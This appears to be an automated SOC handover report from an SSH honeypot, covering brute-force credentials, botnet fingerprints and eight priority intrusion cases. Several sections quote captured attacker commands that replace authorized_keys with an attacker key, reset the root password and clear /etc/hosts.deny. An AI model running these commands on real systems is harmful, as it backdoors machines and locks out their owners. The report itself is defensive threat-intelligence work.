# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-02 |
| **Generated At** | 2026-04-02T10:50:52Z |
| **Shift Time** | 10:50 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **46** |
| Confirmed Threats | **40** |
| False Positives Filtered | **6** (13.0%) |
| Unique Attacker IPs | **34** |
| Countries of Origin | **13** |
| High Severity Cases | **8** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **38** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **31** |
| Unique Credential Pairs | **25** |
| Unique Usernames | **18** |
| Unique Passwords | **25** |
| Successful Auth Pairs | **8** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 8 |
| `345gs5662d34` | 4 |
| `ubnt` | 2 |
| `mysql` | 2 |
| `admin` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 4 |
| `3245gs5662d34` | 3 |
| `admin` | 2 |
| `888` | 1 |
| `44444` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 4 |
| `root` | `3245gs5662d34` | 3 |
| `admin` | `admin` | 2 |
| `blank` | `888` | 1 |
| `ubnt` | `44444` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `MyLove` | `115.151.72.122` | 2026-04-02T09:14:31 |
| `root` | `zxcasdqwe` | `43.164.195.69` | 2026-04-02T10:19:37 |
| `root` | `3245gs5662d34` | `43.164.195.69` | 2026-04-02T10:19:46 |
| `root` | `@Admin123!@` | `34.85.163.94` | 2026-04-02T10:20:06 |
| `root` | `3245gs5662d34` | `34.85.163.94` | 2026-04-02T10:20:11 |
| `root` | `P` | `138.124.65.80` | 2026-04-02T10:47:49 |
| `root` | `sara` | `40.83.182.122` | 2026-04-02T10:48:11 |
| `root` | `3245gs5662d34` | `40.83.182.122` | 2026-04-02T10:48:16 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **46** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 21 |
| OpenSSH | 17 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 17 | 17 |
| `03a80b21afa8...` | Modern SSH client | 14 | 6 |
| `19532158b559...` | Mirai/variant | 4 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 17 | 17 | Mirai/variant |
| `03a80b21afa8...` | libssh | 14 | 6 | Modern SSH client |
| `19532158b559...` | libssh | 4 | 2 | Mirai/variant |
| `95420f9d932d...` | libssh | 3 | 3 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:hdsA0HerWV4X"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `115.151.72.122`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `40.83.182.122`, `43.164.195.69`, `34.85.163.94`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **34** |
| Unique ASNs | **26** |
| High-Risk ASNs | **23** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS132203` | Tencent Building, Kejizhongyi Avenue | 2 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 2 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 2 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS46562` | Performive LLC | 2 | MEDIUM |
| `AS22773` | Cox Communications Inc. | 2 | MEDIUM |
| `AS396982` | Google LLC | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (8)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-44414bad01a6

| Field | Detail |
|---|---|
| **Source IP** | `115.151.72[.]122` |
| **First Seen** | 2026-04-02 09:14 |
| **Last Seen** | 2026-04-02 09:14 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:hdsA0HerWV4X"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-02 09:14:31` | `cowrie.session.connect` |
| `2026-04-02 09:14:31` | `cowrie.client.version` |
| `2026-04-02 09:14:31` | `cowrie.client.kex` |
| `2026-04-02 09:14:31` | `cowrie.login.success` |
| `2026-04-02 09:14:32` | `cowrie.session.params` |
| `2026-04-02 09:14:32` | `cowrie.command.input` |
| `2026-04-02 09:14:32` | `cowrie.command.failed` |
| `2026-04-02 09:14:32` | `cowrie.log.closed` |
| `2026-04-02 09:14:32` | `cowrie.session.params` |
| `2026-04-02 09:14:32` | `cowrie.command.input` |
| `2026-04-02 09:14:32` | `cowrie.session.file_download` |
| `2026-04-02 09:14:32` | `cowrie.log.closed` |
| `2026-04-02 09:14:42` | `cowrie.session.params` |
| `2026-04-02 09:14:42` | `cowrie.command.input` |
| `2026-04-02 09:14:43` | `cowrie.log.closed` |
| `2026-04-02 09:14:43` | `cowrie.session.params` |
| `2026-04-02 09:14:43` | `cowrie.command.input` |
| `2026-04-02 09:14:43` | `cowrie.log.closed` |
| `2026-04-02 09:14:43` | `cowrie.session.params` |
| `2026-04-02 09:14:43` | `cowrie.command.input` |
| `2026-04-02 09:14:43` | `cowrie.session.file_download` |
| `2026-04-02 09:14:43` | `cowrie.log.closed` |
| `2026-04-02 09:14:44` | `cowrie.session.params` |
| `2026-04-02 09:14:44` | `cowrie.command.input` |
| `2026-04-02 09:14:44` | `cowrie.log.closed` |
| `2026-04-02 09:14:44` | `cowrie.session.params` |
| `2026-04-02 09:14:44` | `cowrie.command.input` |
| `2026-04-02 09:14:44` | `cowrie.log.closed` |
| `2026-04-02 09:14:45` | `cowrie.session.params` |
| `2026-04-02 09:14:45` | `cowrie.command.input` |
| `2026-04-02 09:14:45` | `cowrie.command.input` |
| `2026-04-02 09:14:45` | `cowrie.log.closed` |
| `2026-04-02 09:14:45` | `cowrie.session.params` |
| `2026-04-02 09:14:45` | `cowrie.command.input` |
| `2026-04-02 09:14:45` | `cowrie.log.closed` |
| `2026-04-02 09:14:46` | `cowrie.session.params` |
| `2026-04-02 09:14:46` | `cowrie.command.input` |
| `2026-04-02 09:14:46` | `cowrie.log.closed` |
| `2026-04-02 09:14:46` | `cowrie.session.params` |
| `2026-04-02 09:14:46` | `cowrie.command.input` |
| `2026-04-02 09:14:46` | `cowrie.log.closed` |
| `2026-04-02 09:14:47` | `cowrie.session.params` |
| `2026-04-02 09:14:47` | `cowrie.command.input` |
| `2026-04-02 09:14:47` | `cowrie.log.closed` |
| `2026-04-02 09:14:47` | `cowrie.session.params` |
| `2026-04-02 09:14:47` | `cowrie.command.input` |
| `2026-04-02 09:14:47` | `cowrie.log.closed` |
| `2026-04-02 09:14:47` | `cowrie.session.params` |
| `2026-04-02 09:14:47` | `cowrie.command.input` |
| `2026-04-02 09:14:48` | `cowrie.log.closed` |
| `2026-04-02 09:14:48` | `cowrie.session.params` |
| `2026-04-02 09:14:48` | `cowrie.command.input` |
| `2026-04-02 09:14:48` | `cowrie.log.closed` |
| `2026-04-02 09:14:48` | `cowrie.session.params` |
| `2026-04-02 09:14:48` | `cowrie.command.input` |
| `2026-04-02 09:14:48` | `cowrie.log.closed` |
| `2026-04-02 09:14:49` | `cowrie.session.params` |
| `2026-04-02 09:14:49` | `cowrie.command.input` |
| `2026-04-02 09:14:49` | `cowrie.log.closed` |
| `2026-04-02 09:14:49` | `cowrie.session.params` |
| `2026-04-02 09:14:49` | `cowrie.command.input` |
| `2026-04-02 09:14:49` | `cowrie.log.closed` |
| `2026-04-02 09:14:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.151.72[.]122` to AbuseIPDB if not already reported
- [ ] Block `115.151.72[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6e44f7f0bbe

| Field | Detail |
|---|---|
| **Source IP** | `43.164.195[.]69` |
| **First Seen** | 2026-04-02 10:19 |
| **Last Seen** | 2026-04-02 10:19 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-02 10:19:35` | `cowrie.session.connect` |
| `2026-04-02 10:19:35` | `cowrie.client.version` |
| `2026-04-02 10:19:36` | `cowrie.client.kex` |
| `2026-04-02 10:19:37` | `cowrie.login.success` |
| `2026-04-02 10:19:38` | `cowrie.session.params` |
| `2026-04-02 10:19:38` | `cowrie.command.input` |
| `2026-04-02 10:19:38` | `cowrie.command.failed` |
| `2026-04-02 10:19:39` | `cowrie.log.closed` |
| `2026-04-02 10:19:39` | `cowrie.session.params` |
| `2026-04-02 10:19:39` | `cowrie.command.input` |
| `2026-04-02 10:19:40` | `cowrie.session.file_download` |
| `2026-04-02 10:19:40` | `cowrie.log.closed` |
| `2026-04-02 10:19:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.164.195[.]69` to AbuseIPDB if not already reported
- [ ] Block `43.164.195[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-373d07201337

| Field | Detail |
|---|---|
| **Source IP** | `43.164.195[.]69` |
| **First Seen** | 2026-04-02 10:19 |
| **Last Seen** | 2026-04-02 10:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-02 10:19:44` | `cowrie.session.connect` |
| `2026-04-02 10:19:44` | `cowrie.client.version` |
| `2026-04-02 10:19:44` | `cowrie.client.kex` |
| `2026-04-02 10:19:46` | `cowrie.login.success` |
| `2026-04-02 10:19:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.164.195[.]69` to AbuseIPDB if not already reported
- [ ] Block `43.164.195[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-292451fbe593

| Field | Detail |
|---|---|
| **Source IP** | `34.85.163[.]94` |
| **First Seen** | 2026-04-02 10:20 |
| **Last Seen** | 2026-04-02 10:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-02 10:20:04` | `cowrie.session.connect` |
| `2026-04-02 10:20:04` | `cowrie.client.version` |
| `2026-04-02 10:20:05` | `cowrie.client.kex` |
| `2026-04-02 10:20:06` | `cowrie.login.success` |
| `2026-04-02 10:20:06` | `cowrie.session.params` |
| `2026-04-02 10:20:06` | `cowrie.command.input` |
| `2026-04-02 10:20:06` | `cowrie.command.failed` |
| `2026-04-02 10:20:06` | `cowrie.log.closed` |
| `2026-04-02 10:20:07` | `cowrie.session.params` |
| `2026-04-02 10:20:07` | `cowrie.command.input` |
| `2026-04-02 10:20:07` | `cowrie.session.file_download` |
| `2026-04-02 10:20:07` | `cowrie.log.closed` |
| `2026-04-02 10:20:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.85.163[.]94` to AbuseIPDB if not already reported
- [ ] Block `34.85.163[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55bec64ed785

| Field | Detail |
|---|---|
| **Source IP** | `34.85.163[.]94` |
| **First Seen** | 2026-04-02 10:20 |
| **Last Seen** | 2026-04-02 10:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-02 10:20:10` | `cowrie.session.connect` |
| `2026-04-02 10:20:10` | `cowrie.client.version` |
| `2026-04-02 10:20:10` | `cowrie.client.kex` |
| `2026-04-02 10:20:11` | `cowrie.login.success` |
| `2026-04-02 10:20:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.85.163[.]94` to AbuseIPDB if not already reported
- [ ] Block `34.85.163[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57bc6f132004

| Field | Detail |
|---|---|
| **Source IP** | `138.124.65[.]80` |
| **First Seen** | 2026-04-02 10:47 |
| **Last Seen** | 2026-04-02 10:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-02 10:47:46` | `cowrie.session.connect` |
| `2026-04-02 10:47:47` | `cowrie.client.version` |
| `2026-04-02 10:47:47` | `cowrie.client.kex` |
| `2026-04-02 10:47:49` | `cowrie.login.success` |
| `2026-04-02 10:47:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.65[.]80` to AbuseIPDB if not already reported
- [ ] Block `138.124.65[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a4031a36f0d

| Field | Detail |
|---|---|
| **Source IP** | `40.83.182[.]122` |
| **First Seen** | 2026-04-02 10:48 |
| **Last Seen** | 2026-04-02 10:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-02 10:48:10` | `cowrie.session.connect` |
| `2026-04-02 10:48:10` | `cowrie.client.version` |
| `2026-04-02 10:48:10` | `cowrie.client.kex` |
| `2026-04-02 10:48:11` | `cowrie.login.success` |
| `2026-04-02 10:48:11` | `cowrie.session.params` |
| `2026-04-02 10:48:11` | `cowrie.command.input` |
| `2026-04-02 10:48:11` | `cowrie.command.failed` |
| `2026-04-02 10:48:12` | `cowrie.log.closed` |
| `2026-04-02 10:48:12` | `cowrie.session.params` |
| `2026-04-02 10:48:12` | `cowrie.command.input` |
| `2026-04-02 10:48:12` | `cowrie.session.file_download` |
| `2026-04-02 10:48:12` | `cowrie.log.closed` |
| `2026-04-02 10:48:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.83.182[.]122` to AbuseIPDB if not already reported
- [ ] Block `40.83.182[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2493d288e172

| Field | Detail |
|---|---|
| **Source IP** | `40.83.182[.]122` |
| **First Seen** | 2026-04-02 10:48 |
| **Last Seen** | 2026-04-02 10:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-02 10:48:15` | `cowrie.session.connect` |
| `2026-04-02 10:48:15` | `cowrie.client.version` |
| `2026-04-02 10:48:15` | `cowrie.client.kex` |
| `2026-04-02 10:48:16` | `cowrie.login.success` |
| `2026-04-02 10:48:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.83.182[.]122` to AbuseIPDB if not already reported
- [ ] Block `40.83.182[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `115.151.72[.]122` | **2** | 2026-04-02 09:14 | 2026-04-02 09:16 | 2m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `138.124.65[.]80` | **2** | 2026-04-02 10:45 | 2026-04-02 10:46 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `180.76.172[.]156` | **2** | 2026-04-02 10:23 | 2026-04-02 10:31 | 2m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.163.15[.]176` | **2** | 2026-04-02 08:57 | 2026-04-02 08:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.112.224[.]81` | 1 | 2026-04-02 10:45 | 2026-04-02 10:45 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.156.237[.]37` | 1 | 2026-04-02 10:45 | 2026-04-02 10:45 | 7s | 0 | `T1592` | 🟢 LOW |
| `103.250.160[.]76` | 1 | 2026-04-02 09:19 | 2026-04-02 09:19 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `111.70.21[.]178` | 1 | 2026-04-02 10:38 | 2026-04-02 10:38 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.26.99[.]93` | 1 | 2026-04-02 09:21 | 2026-04-02 09:21 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.52[.]58` | 1 | 2026-04-02 09:18 | 2026-04-02 09:19 | 80s | 0 | `T1592` | 🟢 LOW |
| `150.246.249[.]149` | 1 | 2026-04-02 09:42 | 2026-04-02 09:43 | 31s | 0 | `T1592` | 🟢 LOW |
| `176.65.148[.]214` | 1 | 2026-04-02 09:12 | 2026-04-02 09:13 | 30s | 0 | `T1592` | 🟢 LOW |
| `179.185.1[.]97` | 1 | 2026-04-02 09:01 | 2026-04-02 09:01 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.250.89[.]44` | 1 | 2026-04-02 09:14 | 2026-04-02 09:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `192.200.205[.]244` | 1 | 2026-04-02 08:54 | 2026-04-02 08:54 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `211.253.10[.]61` | 1 | 2026-04-02 08:59 | 2026-04-02 08:59 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `219.129.236[.]174` | 1 | 2026-04-02 09:12 | 2026-04-02 09:12 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `220.246.42[.]212` | 1 | 2026-04-02 10:39 | 2026-04-02 10:39 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `27.123.98[.]26` | 1 | 2026-04-02 10:05 | 2026-04-02 10:05 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `34.85.163[.]94` | 1 | 2026-04-02 10:20 | 2026-04-02 10:20 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `40.83.182[.]122` | 1 | 2026-04-02 10:48 | 2026-04-02 10:48 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `43.163.231[.]187` | 1 | 2026-04-02 09:40 | 2026-04-02 09:40 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `43.164.195[.]69` | 1 | 2026-04-02 10:19 | 2026-04-02 10:19 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `46.201.247[.]21` | 1 | 2026-04-02 10:25 | 2026-04-02 10:25 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `50.149.161[.]131` | 1 | 2026-04-02 10:08 | 2026-04-02 10:08 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.20.175[.]6` | 1 | 2026-04-02 09:06 | 2026-04-02 09:06 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `77.106.78[.]215` | 1 | 2026-04-02 09:31 | 2026-04-02 09:31 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `95.79.57[.]221` | 1 | 2026-04-02 10:20 | 2026-04-02 10:20 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
